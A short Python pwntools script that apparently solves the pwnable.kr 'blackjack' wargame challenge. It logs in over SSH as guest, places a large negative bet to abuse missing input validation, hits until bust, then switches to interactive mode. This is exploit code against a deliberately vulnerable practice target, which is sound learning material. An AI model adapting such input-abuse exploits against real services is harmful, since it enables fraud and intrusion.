#!/usr/bin/env python
from pwn import *

server = ssh('blackjack', 'pwnable.kr', 2222, 'guest')
io = server.process(['nc', '0', '9009'])

io.sendline('Y')
io.sendline('1')  # Choose to play
io.sendline('-1000000')  # Send a large negative bet to trigger the exploit

# hit until bust
while True:
    print(io.recvuntil("Please Enter H to Hit or S to Stay.", timeout=1).decode())
    io.sendline('H')
    response = io.recv(timeout=1).decode()
    if 'Woah Buddy, You Went WAY over.' in response:
        break

io.sendline('Y')  # pay again
io.interactive()  # interact with the shell